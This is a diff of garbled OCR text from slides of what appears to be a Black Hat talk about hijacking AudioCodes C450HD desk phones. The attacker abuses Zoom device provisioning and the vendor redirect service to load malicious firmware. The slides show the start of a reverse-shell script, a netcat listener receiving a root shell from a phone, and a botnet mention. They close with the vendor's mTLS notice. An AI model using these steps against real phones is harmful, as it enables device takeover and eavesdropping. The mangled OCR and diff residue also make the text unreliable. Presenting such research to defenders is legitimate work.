-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 File Edit Search View Format Scripts Templates Debug Project Tools Window Help
-Be Biever '-hROC SEB FS = 5
 A4 39 05 41.17 00 00 00 A& 39 05 41/17 00 00 00 59.A....°9.A..
 CO 39 05 41/17 00 00 00'C4 39 05 41 17 00 00 00 AY.A....A9.A..
 ```
@@ -2591,12 +2139,10 @@ CO 39 05 41/17 00 00 00'C4 39 05 41 17 00 00 00 AY.A....A9.A..
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
-(pmabrett
 $ 11
 total 3/K
 drwxr-xr-x
@@ -2607,25 +2153,14 @@ drwxr-xr-
 drwxr
 drwxr-xr-
 drwxr-xr-
--rwxr
 drwxr-xr-
 drwxr-xr-
 drwxr
 -rwxr
 drwxr
 drwxr
--rw-r--r
--rwxr
--rwxr ;
 drwxr-xr-x
-uTwat=
--rw-r--r
-GT WRT
 -rwxr
--rwXxr
--rwxr
--rwxr
--rwxr ;
 drwxr-xr-x
 root root
 root root
@@ -2639,50 +2174,28 @@ root root
 root root
 root root
 root root
-root root : ] :50 ntpser. List
 r root
 root root .
 root root . ! production.cfg
 root root :
 root root
 root root
-root root
-root Toot i
 root root |
 root root . .s
 root root . j udhcpc.script.option43
-root root : ] : udhcpc.vlanid. script
-root . ] udhcpc.wlan0.script
 root
-™
-ee
--X
--X
--X
--X
--X
-Oe Se eR PNPM NRE RPP ON PW BNP Whee he ehh OB
 ```
 
 ## Slide 111
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 2&0e253
-00 oO9.A....@9.A....
-00 O9.A....9%»»~
-00 rootfs.ext4
-```
-
 ## Slide 112
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 [admin@C450HD /home/ipphone]# cat /etc/release
@@ -2701,17 +2214,12 @@ LOG=0
 SWVERSION=UC 3.4.6.604.1
 [admin@C450HD /home/ipphone]# ls -la
 total 39
--Pwxr-xr-xX
 - rwxr-xr-X
-- rwxr-Xxr-x
-- rwxr-XIr-X
 drwxr-xr-x
 admin root : udhcpc.script
 admin root : udhcpc.script.option43
 admin root : udhcpc.vlanid ript
-admin root : udhcpc.wlan®. script
 admin root
-[admin@C450HD /home/ipphone]# ]
 drwxr-xr-x 19 admin root
 drwxr-xr-x 4 admin root
 drwxr-xr-x 2 admin root
@@ -2722,7 +2230,6 @@ drwxr-xr-x 2 admin root
 drwxr-xr-x 2 admin root
 drwxr-xr-x 2 admin root
 drwxr-xr-x 3 admin root
--rwxr-xr-x 1 admin root : Lighttpd. conf
 drwxr-xr-x 2 admin root
 drwxr-xr-x 4 admin root
 drwxr-xr-x 3 admin root
@@ -2730,25 +2237,22 @@ drwxr-xr-x 3 admin root
 drwxr-xr-x 2 admin root
 drwxr-xr-x 6 admin root
 -rw-r--r-- 1 admin root : production.cfg
-- PWXIP-XP-X 1 admin root rc. local
 -rwxr-xr-X 1 admin root = rcS
 drwxr-xr-x 2 admin root ‘ —
-UT WXT=XT=x 2 admin root ‘eee
 -rw-r--r-- 1 admin root : syss-poc.txt *~ «a
-idrwxr-xr-x 2 admin root AR: 5e
 -rwxr-xr-xX 1 admin root - tz.lst 3-9
 1
 1
 1
 1
-5
 ```
 
 ## Slide 113
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CC audiocodes
@@ -2772,11 +2276,10 @@ A rade Fail
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 #!/bin/sh
 /bin/sleep 120
 TF=$(/bin/mktemp -u)
@@ -2788,12 +2291,10 @@ TF=$(/bin/mktemp -u)
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
-USA 2&0e253
-SN eee
 L$ ne -lvkp 5000
 listening on [any] 5000 ...
 connect to | | From .t-ipconnect.de [93.229
@@ -2807,26 +2308,22 @@ BUILD OWNER=centos@ip-1/72-16-142-244.corp.audiocodes.com
 BUILD PROFILE=C45@HD
 IMG_BLVERSION=4.0.3
 SYSDATETIME=121300002021
-VCS=ga461lba3ee0
-[default]
 BUILD TIME=2021-12-13 09:07:38
-Hw TYPE=C456HD
 LOG=0
 SWVERSION=UC_3.4.6.604.1
-U
 ```
 
 ## Slide 117
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ZOOM
 1. adds a device and assigns
 a configuration template
-rx
 aa
 attacker
 ```
@@ -2835,7 +2332,8 @@ attacker
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 vendor redirect service
@@ -2846,7 +2344,6 @@ server for the added device
 ZOOM
 1. adds a device and assigns
 a configuration template
-rx
 aa
 attacker
 ```
@@ -2855,7 +2352,8 @@ attacker
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 vendor redirect service
@@ -2866,7 +2364,6 @@ desk phone the provisioning and configuration
 ZOOM
 1. adds a device and assigns
 a configuration template
-rx
 aa
 attacker
 ```
@@ -2875,7 +2372,8 @@ attacker
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 vendor redirect service
@@ -2884,11 +2382,9 @@ A
 the provisioning and configuration
 server for the added device
 desk phone
-—
 ZOOM
 1. adds a device and assigns
 a configuration template
-rx
 aa
 attacker
 ```
@@ -2897,7 +2393,8 @@ attacker
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 vendor redirect service
@@ -2909,7 +2406,6 @@ desk phone
 ZOOM
 1. adds a device and assigns
 a configuration template
-rx
 aa
 attacker
 ```
@@ -2918,7 +2414,8 @@ attacker
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 vendor redirect service
@@ -2930,7 +2427,6 @@ desk phone
 ZOOM
 1. adds a device and assigns
 a configuration template
-rx
 aa
 attacker
 ```
@@ -2939,7 +2435,8 @@ attacker
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 vendor redirect service
@@ -2954,8 +2451,6 @@ malicious firmware
 1. adds a device and assigns
 v a configuration template
 controls
-ano] @---------------- e
-— aaa
 attacker
 attacker server
 ```
@@ -2964,7 +2459,8 @@ attacker server
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 vendor redirect service
@@ -2979,8 +2475,6 @@ initiated malicious firmware
 1. adds a device and assigns
 v a configuration template
 controls
-amo) rN
-fumao} -------------------- >Re
 attacker
 attacker server
 ```
@@ -2989,7 +2483,8 @@ attacker server
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 ADMIN
@@ -3016,15 +2511,13 @@ Logs
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 Import
 Batch import unassigned Desk Phones.
 Uploading
-Fo
 Running in the Background
 10%
 ```
@@ -3033,12 +2526,10 @@ Running in the Background
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 2&0e253
 =] Desk Phone
 =] Desk Phone
 =] Desk Phone
@@ -3062,14 +2553,11 @@ AudioCodes c450hd
 00-90-8f-9d-b3-06
 00-90-8f-9d-b3-09
 00-90-8f-9d-b3-08
-00-90-8f-9d-b3-Oc
 00-90-8f-9d-b3-Ob
 00-90-8f-9d-b3-Of
-00-90-8f-9d-b3-25
 Page 1
 of 18
 }
-Page Size 15 ,
 Total 256
 ```
 
@@ -3110,17 +2598,6 @@ Total 256
 ## Slide 135
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 20es3
-ier
-a
-Guceen
-bot net
-```
 
 ## Slide 136
 
@@ -3166,7 +2643,8 @@ SYSS-2022-052:
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Product Notice #0503
@@ -3179,7 +2657,6 @@ establishing a connection. This additional layer of authentication safeguards ag
 strengthening the overall security of AudioCodes Redirect Service.
 Note: By default, mTLS is disabled, allowing currently deployed devices that may not possess the appropriate
 certificates to continue accessing and using the Redirect Service. However, we recommend that Customers enable
-mTLS.
 #BHUSA @BlackHatEvents
 ```
 
@@ -3187,7 +2664,8 @@ mTLS.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Note: By default, mTLS is disabled, allowing currently deployed devices that may not possess the appropriate
